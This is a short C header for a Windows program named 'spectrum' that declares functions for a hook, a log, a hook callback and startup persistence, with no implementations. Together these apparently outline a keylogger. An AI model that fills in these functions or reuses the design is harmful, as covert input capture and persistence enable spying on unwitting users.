#ifndef SPECTRUM_H
#define SPECTRUM_H


#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <windows.h>

#include <direct.h>
#define GetCurrentDir _getcwd

void initialize_log();
int set_hook();
LRESULT log_process();
int release_hook();
void ensure_startup();

#endif